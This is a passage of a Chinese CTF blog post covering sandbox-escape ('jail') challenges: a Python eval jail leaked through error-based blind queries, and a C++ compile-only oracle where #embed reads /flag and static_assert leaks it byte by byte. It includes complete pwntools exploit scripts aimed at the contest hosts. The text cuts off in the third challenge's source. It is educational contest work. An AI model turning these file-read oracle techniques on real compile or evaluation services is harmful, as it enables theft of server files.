    <entry>
      <title>misc:近期几道jail</title>
      <link href="/2025/11/10/misc-jail/"/>
      <url>/2025/11/10/misc-jail/</url>
      
        <content type="html"><![CDATA[<p>这段时间做了几道python&#x2F;C++的jail（可能也不算jail），记录一下。</p><p>第一题先撤了，过段时间再贴上来。</p><h2 id="speechless-2025-infobahnctf"><a href="#speechless-2025-infobahnctf" class="headerlink" title="speechless(2025 infobahnctf)"></a>speechless(2025 infobahnctf)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line">allowed = <span class="string">&quot;ab.=-/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">a = <span class="literal">None</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    expr = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(char <span class="keyword">in</span> allowed <span class="keyword">for</span> char <span class="keyword">in</span> expr):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;you need to try harder&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(<span class="string">f&quot;<span class="subst">&#123;blocked&#125;</span>==&quot;</span> <span class="keyword">in</span> expr <span class="keyword">or</span> <span class="string">f&quot;==<span class="subst">&#123;blocked&#125;</span>&quot;</span> <span class="keyword">in</span> expr <span class="keyword">for</span> blocked <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;stop comparing the flag&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = <span class="built_in">eval</span>(expr, &#123;<span class="string">&quot;a&quot;</span>: a&#125; | &#123;<span class="string">&quot;b&quot;</span> * (index + <span class="number">1</span>): char <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag)&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        a = <span class="literal">None</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;stop breaking things &gt;:(&#x27;</span>)</span><br></pre></td></tr></table></figure><p>允许输入的字符更少了，只有<code>ab.=-/</code>。好在flag的每一字节都已经放入b,bb,bbb…(其中b…b(k个b)表示flag的第k位的值)里了，只需要读取就好。<br>输入的表达式自动赋值给a，不会输出什么但是会报错（显然要用盲注了）。<br>对于第k位，<br>1.a&#x3D;b…b(k个b)<br>2.a&#x3D;a-要爆破的值，其中要爆破的值可以用–b&#x2F;&#x2F;b代替1，然后累加。<br>3.a&#x3D;b&#x2F;&#x2F;b&#x2F;&#x2F;a(如果报错，说明a是0，即正确)<br>让AI写了段二分查找的爆破代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote, log</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;speechless.challs.infobahnc.tf&#x27;</span>  </span><br><span class="line">PORT = <span class="number">1337</span>         </span><br><span class="line"></span><br><span class="line">KNOWN_PREFIX = <span class="string">b&#x27;infobahn&#123;&#x27;</span></span><br><span class="line">KNOWN_LEN = <span class="built_in">len</span>(KNOWN_PREFIX)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_expr</span>(<span class="params">p, expr</span>):</span><br><span class="line">    p.sendline(expr.encode())</span><br><span class="line">    out = p.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_length</span>(<span class="params">p</span>):</span><br><span class="line">    pos = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        var = <span class="string">&#x27;b&#x27;</span> * pos</span><br><span class="line">        out = send_expr(p, var)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;stop breaking things&#x27;</span> <span class="keyword">in</span> out:</span><br><span class="line">            <span class="keyword">return</span> pos - <span class="number">1</span></span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_byte</span>(<span class="params">p, pos</span>):</span><br><span class="line">    var = <span class="string">&#x27;b&#x27;</span> * pos</span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">255</span></span><br><span class="line">    log.info(<span class="string">f&quot;Leaking byte at position <span class="subst">&#123;pos&#125;</span> (0-based index: <span class="subst">&#123;pos-<span class="number">1</span>&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        sub = <span class="string">&#x27;-b//b&#x27;</span> * mid  <span class="comment"># Subtract 1, mid times</span></span><br><span class="line">        expr2 = <span class="string">&#x27;a&#x27;</span> + sub <span class="keyword">if</span> mid &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">        out1 = send_expr(p, var)  <span class="comment"># a = byte</span></span><br><span class="line">        <span class="keyword">if</span> out1 != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            log.error(<span class="string">f&quot;Failed to set a for pos <span class="subst">&#123;pos&#125;</span>: <span class="subst">&#123;out1&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        out2 = send_expr(p, expr2)  <span class="comment"># a = byte - mid</span></span><br><span class="line">        <span class="keyword">if</span> out2 != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            log.error(<span class="string">f&quot;Failed to subtract for mid <span class="subst">&#123;mid&#125;</span>: <span class="subst">&#123;out2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        out3 = send_expr(p, <span class="string">&#x27;b//b//a&#x27;</span>)  <span class="comment"># 1 // a</span></span><br><span class="line">        out4 = send_expr(p, <span class="string">&#x27;a--b//b&#x27;</span>)  <span class="comment"># a + 1</span></span><br><span class="line">        out5 = send_expr(p, <span class="string">&#x27;b//b/a&#x27;</span>)   <span class="comment"># 1 / a</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># If any of out3, out4, out5 contains &#x27;stop breaking things&#x27;, then byte &lt;= mid</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(<span class="string">&#x27;stop breaking things&#x27;</span> <span class="keyword">in</span> o <span class="keyword">for</span> o <span class="keyword">in</span> [out3, out4, out5]):</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Byte at position <span class="subst">&#123;pos&#125;</span>: <span class="subst">&#123;low&#125;</span> (<span class="subst">&#123;<span class="built_in">chr</span>(low)&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> low</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    flag_len = find_length(p)</span><br><span class="line">    log.success(<span class="string">f&quot;Flag length: <span class="subst">&#123;flag_len&#125;</span>&quot;</span>)</span><br><span class="line">    flag_bytes = <span class="built_in">list</span>(KNOWN_PREFIX)</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(KNOWN_LEN + <span class="number">1</span>, flag_len + <span class="number">1</span>):</span><br><span class="line">        byte = leak_byte(p, pos)</span><br><span class="line">        <span class="keyword">if</span> byte <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            log.error(<span class="string">&quot;Leaking failed&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        flag_bytes.append(byte)</span><br><span class="line"></span><br><span class="line">    flag = <span class="built_in">bytes</span>(flag_bytes)</span><br><span class="line">    log.success(<span class="string">f&quot;Flag: <span class="subst">&#123;flag.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>infobahn{i_can’t_believe_i_used_ellipsis_in_a_jail_…}</p><p>接下来是两道C++相关的。</p><h2 id="Warden-2025-geekgame"><a href="#Warden-2025-geekgame" class="headerlink" title="Warden++(2025 geekgame)"></a>Warden++(2025 geekgame)</h2><p>这也是盲注。输入一段C++代码，只给出编译正确与否的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">🎮 C++ in your area! 🎮</span></span><br><span class="line"><span class="string">    Test your code&#x27;s worthiness! Can you still steal the flag if you have only the compilation result?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Rules:</span></span><br><span class="line"><span class="string">1. Submit your C++ code, please end it with an extra line containing only &#x27;END&#x27;, e.g.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    int main() &#123;</span></span><br><span class="line"><span class="string">       return 0; </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    END</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2. Our compiler will judge its syntax</span></span><br><span class="line"><span class="string">3. Verdict: Success or Defeat!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">No execution, just pure compilation checking.</span></span><br><span class="line"><span class="string">Good luck, brave hacker!</span></span><br><span class="line"><span class="string">P.S Flag is at /flag on the server :)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compile_check</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">with</span> tempfile.NamedTemporaryFile(suffix=<span class="string">&#x27;.cpp&#x27;</span>, delete=<span class="literal">False</span>) <span class="keyword">as</span> tmp:</span><br><span class="line">        tmp.write(code.encode())</span><br><span class="line">        tmp.flush()</span><br><span class="line">        </span><br><span class="line">        result = subprocess.run([<span class="string">&#x27;g++-15&#x27;</span>, tmp.name], </span><br><span class="line">                              stdout=subprocess.DEVNULL,</span><br><span class="line">                              stderr=subprocess.DEVNULL,</span><br><span class="line">                              text=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        os.unlink(tmp.name)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> result.returncode == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;✅ Compilation Success! Your code is syntactically perfect!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;❌ Compilation Failed! &quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(result.stderr)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line"></span><br><span class="line">    code = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        line = sys.stdin.readline()</span><br><span class="line">        <span class="keyword">if</span> line.strip() == <span class="string">&quot;END&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        code += line</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(code) &gt; <span class="number">0x1000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;❌ Code too long! Limit is 4096 characters.&quot;</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    compile_check(code)</span><br></pre></td></tr></table></figure><p>查找g++15(C++ 26)的特性发现#embed功能。</p><p>#embed可以进行任意文件读取。构造类似如下的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constexpr</span> <span class="type">unsigned</span> <span class="type">char</span> flag[] = &#123;</span><br><span class="line"><span class="meta">#embed <span class="string">&quot;/flag&quot;</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">static_assert</span>(<span class="built_in">sizeof</span>(flag) &lt;= <span class="number">50</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><p>用#embed “&#x2F;flag”读取&#x2F;flag文件到flag[]数组中。然后用static_assert(表达式)盲注，如果表达式正确返回”✅ Compilation Success! Your code is syntactically perfect!”，否则返回”❌ Compilation Failed!”。</p><p>接下来让AI按照这个思路写了段代码，先爆出flag长度，再逐字节爆出flag的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">code, conn</span>):</span><br><span class="line">    conn.sendline(code.strip().encode())</span><br><span class="line">    conn.sendline(<span class="string">b&quot;END&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        line = conn.recvline().decode().strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Success&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                conn.recvline(timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        log.error(<span class="string">&quot;Connection closed by server&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_size</span>(<span class="params">conn, max_guess=<span class="number">128</span></span>):</span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = max_guess</span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">        code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">constexpr unsigned char flag[] = &#123;&#123;</span></span><br><span class="line"><span class="string">#embed &quot;/flag&quot;</span></span><br><span class="line"><span class="string">&#125;&#125;;</span></span><br><span class="line"><span class="string">static_assert(sizeof(flag) &gt;= <span class="subst">&#123;mid&#125;</span>, &quot;&quot;);</span></span><br><span class="line"><span class="string">int main() &#123;&#123; return 0; &#125;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">        log.info(<span class="string">f&quot;Testing size &gt;= <span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> submit(code, conn):</span><br><span class="line">            low = mid</span><br><span class="line">            log.success(<span class="string">f&quot;Size &gt;= <span class="subst">&#123;mid&#125;</span> confirmed&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">            log.info(<span class="string">f&quot;Size &lt; <span class="subst">&#123;mid&#125;</span> confirmed&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> low</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_byte</span>(<span class="params">conn, i</span>):</span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">        code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">constexpr unsigned char flag[] = &#123;&#123;</span></span><br><span class="line"><span class="string">#embed &quot;/flag&quot;</span></span><br><span class="line"><span class="string">&#125;&#125;;</span></span><br><span class="line"><span class="string">static_assert(flag[<span class="subst">&#123;i&#125;</span>] &gt;= <span class="subst">&#123;mid&#125;</span>, &quot;&quot;);</span></span><br><span class="line"><span class="string">int main() &#123;&#123; return 0; &#125;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">        log.info(<span class="string">f&quot;Testing byte[<span class="subst">&#123;i&#125;</span>] &gt;= <span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> submit(code, conn):</span><br><span class="line">            low = mid</span><br><span class="line">            log.success(<span class="string">f&quot;Byte[<span class="subst">&#123;i&#125;</span>] &gt;= <span class="subst">&#123;mid&#125;</span> confirmed&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">            log.info(<span class="string">f&quot;Byte[<span class="subst">&#123;i&#125;</span>] &lt; <span class="subst">&#123;mid&#125;</span> confirmed&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> low</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn = remote(<span class="string">&quot;prob07.geekgame.pku.edu.cn&quot;</span>, <span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line">        conn.recvuntil(<span class="string">b&quot;Please input your token: &quot;</span>)</span><br><span class="line">        token = <span class="string">&quot;&quot;</span></span><br><span class="line">        conn.sendline(token.encode())</span><br><span class="line">        conn.recv(timeout=<span class="number">2</span>)  </span><br><span class="line">        log.info(<span class="string">&quot;Starting flag extraction...&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 获取flag大小</span></span><br><span class="line">        size = find_size(conn, <span class="number">128</span>)</span><br><span class="line">        log.success(<span class="string">f&quot;Flag size: <span class="subst">&#123;size&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 逐个字节获取flag内容</span></span><br><span class="line">        flag_bytes = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">            byte = find_byte(conn, i)</span><br><span class="line">            flag_bytes.append(byte)</span><br><span class="line">            current_flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span> &lt;= b &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">f&#x27;\\x<span class="subst">&#123;b:02x&#125;</span>&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> flag_bytes)</span><br><span class="line">            log.success(<span class="string">f&quot;Byte <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;byte&#125;</span> (0x<span class="subst">&#123;byte:02x&#125;</span>) - Current: <span class="subst">&#123;current_flag&#125;</span>&quot;</span>)</span><br><span class="line">        flag_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> flag_bytes)</span><br><span class="line">        log.success(<span class="string">f&quot;Final flag: <span class="subst">&#123;flag_str&#125;</span>&quot;</span>)</span><br><span class="line">        conn.close()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        log.error(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">import</span> traceback</span><br><span class="line">        traceback.print_exc()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="jail-Neuro-jail-2025-newstar-ctf"><a href="#jail-Neuro-jail-2025-newstar-ctf" class="headerlink" title="jail-Neuro jail(2025 newstar ctf)"></a>jail-Neuro jail(2025 newstar ctf)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, base64, subprocess, os</span><br><span class="line">sys.stdout.reconfigure(encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">if</span> <span class="built_in">hasattr</span>(sys.stdout, <span class="string">&#x27;reconfigure&#x27;</span>) <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jail</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(code) &gt; <span class="number">200</span>):</span><br><span class="line">        exit(<span class="string">&quot;Code too long!&quot;</span>)</span><br><span class="line">    blacklist = [<span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> code:</span><br><span class="line">          exit(<span class="string">&quot;Blacklisted word found: &quot;</span> + word)</span><br><span class="line"></span><br><span class="line">content = base64.b64decode(<span class="built_in">input</span>(<span class="string">&quot;Input your base64 content: &quot;</span>).encode()).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">jail(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./template_cpp.cpp&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f: template = f.read()</span><br><span class="line">template = template.replace(<span class="string">&quot;/* YOUR 